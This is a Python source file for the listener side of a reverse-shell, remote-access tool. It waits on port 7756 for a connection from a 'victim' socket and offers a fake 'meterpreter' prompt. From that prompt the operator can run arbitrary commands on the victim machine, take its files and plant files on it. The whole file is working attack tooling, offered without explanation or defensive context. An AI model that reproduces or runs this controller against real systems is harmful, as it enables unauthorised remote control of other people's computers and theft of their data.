import socket
import select
import os
import time

def download_file(file_name, sock):
    sock.send(('download '+file_name).encode())
    os.system('type nul >> '+file_name)
    with open(file_name, "wb") as file:
        chunk = sock.recv(1024)
        while chunk != b'done':
            try:
                file.write(chunk.decode())
            except:
                try:
                    file.write(chunk)
                except:
                    file.write(chunk.decode('utf-8'))

            print("downloading... ")
            chunk = sock.recv(1024)
        else:
            print("done!")
        file.close()

def upload_file(file_name, sock):
    with open(file_name, "rb") as file:
        for line in file:
            print(line)
            sock.send(line)
        time.sleep(1)
        file.close()
        sock.send("done".encode())

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind(("0.0.0.0", 7756))
sock.listen()
print("server is up and running!")
(vic_sock, address) = sock.accept()
ip, port = address
cmd = input("[+] meterpreter "+ip+' '+str(port)+': ')
while True:
    if cmd != "EXIT":
        if cmd[0:2] == "cd":
            vic_sock.send(cmd.encode())
            cmd = input("[+] meterpreter "+ip+' '+str(port)+': ')
        if cmd[:8] == "download":
            download_file(cmd[9:], vic_sock)
            cmd = input("[+] meterpreter "+ip+' '+str(port)+': ')
        elif cmd[0:6] == "upload":
            upload_file(cmd[7:], vic_sock)
            cmd = input("[+] meterpreter "+ip+' '+str(port)+': ')
        else:
            vic_sock.send(cmd.encode())
            try:
                res = vic_sock.recv(1024).decode()
            except:
                res = vic_sock.recv(1024).decode('utf-8')
            print(res)
            cmd = input("[+] meterpreter "+ip+' '+str(port)+': ')
    else:
        print("bye!")
        vic_sock.close()
        break



